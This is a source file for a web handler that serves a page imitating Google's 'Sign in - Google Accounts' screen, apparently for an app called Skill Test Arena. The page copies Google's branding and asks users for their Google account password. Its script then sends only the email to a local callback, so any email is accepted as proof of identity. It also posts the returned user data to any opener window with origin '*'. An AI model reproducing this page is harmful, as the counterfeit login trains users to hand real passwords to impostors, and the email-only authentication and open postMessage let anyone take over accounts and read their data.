/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

export const onRequest: any = async () => {
  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Sign in - Google Accounts</title>
      <script src="https://cdn.tailwindcss.com"></script>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
      <style>
        body { font-family: 'Roboto', sans-serif; }
      </style>
    </head>
    <body class="bg-[#f0f4f9] min-h-screen flex items-center justify-center p-4">
      <div class="bg-white p-8 md:p-10 rounded-3xl shadow-md border border-gray-100 w-full max-w-[450px]">
        <div class="flex flex-col">
          <!-- Google Color G Logo -->
          <div class="flex justify-start mb-6">
            <svg class="h-6" viewBox="0 0 24 24" width="24" height="24" xmlns="http://www.w3.org/2000/svg">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
            </svg>
          </div>
          
          <!-- Step 1: Email Form -->
          <div id="email-step">
            <h1 class="text-2xl font-normal text-[#1f1f1f] tracking-tight mb-2">Sign in</h1>
            <p class="text-sm text-[#444746] mb-8">to continue to Skill Test Arena</p>
            
            <form onsubmit="goToPasswordStep(event)" class="space-y-6">
              <div class="relative">
                <input type="email" id="email" required placeholder="Email or phone" class="w-full px-3.5 py-3.5 border border-gray-300 rounded-lg text-base focus:outline-none focus:ring-2 focus:ring-[#0b57d0]/40 focus:border-[#0b57d0] transition-colors placeholder-transparent peer" />
                <label for="email" class="absolute left-3.5 top-3.5 text-gray-500 text-sm transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-3.5 peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-[#0b57d0] bg-white px-1 -mt-0.5 pointer-events-none origin-left transform -translate-y-4 scale-75 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-4 peer-focus:scale-75">Email or phone</label>
              </div>
              
              <div class="flex justify-between items-center pt-4">
                <button type="button" class="text-sm font-medium text-[#0b57d0] hover:text-[#0a51be] hover:underline bg-transparent border-none cursor-pointer">Create account</button>
                <button type="submit" class="bg-[#0b57d0] hover:bg-[#0a51be] text-white text-sm font-semibold px-6 py-2.5 rounded-full transition-all shadow-sm">Next</button>
              </div>
            </form>
          </div>

          <!-- Step 2: Password Form -->
          <div id="password-step" class="hidden">
            <div class="flex items-center gap-2 mb-4 p-1.5 border border-gray-200 rounded-full hover:bg-gray-50 cursor-pointer w-fit max-w-full" onclick="goToEmailStep()">
              <div class="h-5 w-5 rounded-full bg-gray-100 flex items-center justify-center text-gray-500">
                <svg class="h-3.5 w-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/></svg>
              </div>
              <span id="display-email" class="text-xs font-medium text-gray-600 truncate max-w-[200px]"></span>
            </div>

            <h1 class="text-2xl font-normal text-[#1f1f1f] tracking-tight mb-2">Welcome</h1>
            <p class="text-sm text-[#444746] mb-8">Enter your Google account password to proceed</p>
            
            <form onsubmit="submitAuth(event)" class="space-y-6">
              <div class="relative">
                <input type="password" id="password" required placeholder="Enter your password" class="w-full px-3.5 py-3.5 border border-gray-300 rounded-lg text-base focus:outline-none focus:ring-2 focus:ring-[#0b57d0]/40 focus:border-[#0b57d0] transition-colors placeholder-transparent peer" />
                <label for="password" class="absolute left-3.5 top-3.5 text-gray-500 text-sm transition-all peer-placeholder-shown:text-base peer-placeholder-shown:top-3.5 peer-focus:top-1.5 peer-focus:text-xs peer-focus:text-[#0b57d0] bg-white px-1 -mt-0.5 pointer-events-none origin-left transform -translate-y-4 scale-75 peer-placeholder-shown:translate-y-0 peer-placeholder-shown:scale-100 peer-focus:-translate-y-4 peer-focus:scale-75">Enter your password</label>
              </div>
              
              <div class="flex justify-between items-center pt-4">
                <button type="button" class="text-sm font-medium text-[#0b57d0] hover:text-[#0a51be] hover:underline bg-transparent border-none cursor-pointer">Forgot password?</button>
                <button type="submit" id="submit-btn" class="bg-[#0b57d0] hover:bg-[#0a51be] text-white text-sm font-semibold px-6 py-2.5 rounded-full transition-all shadow-sm flex items-center gap-2">
                  <span>Next</span>
                </button>
              </div>
            </form>
          </div>

        </div>
      </div>

      <script>
        let userEmail = '';

        function goToPasswordStep(e) {
          e.preventDefault();
          userEmail = document.getElementById('email').value.trim();
          if (!userEmail) return;
          
          document.getElementById('display-email').innerText = userEmail;
          document.getElementById('email-step').classList.add('hidden');
          document.getElementById('password-step').classList.remove('hidden');
          setTimeout(() => document.getElementById('password').focus(), 50);
        }

        function goToEmailStep() {
          document.getElementById('password-step').classList.add('hidden');
          document.getElementById('email-step').classList.remove('hidden');
        }

        function submitAuth(e) {
          e.preventDefault();
          const btn = document.getElementById('submit-btn');
          btn.disabled = true;
          btn.innerHTML = '<span class="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full"></span>';
          
          fetch('/api/auth/google-callback', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: userEmail })
          })
          .then(res => {
            if (!res.ok) throw new Error('API reported failure');
            return res.json();
          })
          .then(data => {
            if (window.opener) {
              window.opener.postMessage({ 
                type: 'GOOGLE_SIGNIN_SUCCESS', 
                user: data.user, 
                progress: data.progress 
              }, '*');
              window.close();
            } else {
              alert('Success! You may close this popup window.');
            }
          })
          .catch(err => {
            alert('Authentication failed: ' + err.message);
            btn.disabled = false;
            btn.innerHTML = '<span>Next</span>';
          });
        }
      </script>
    </body>
    </html>
  `;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  });
};
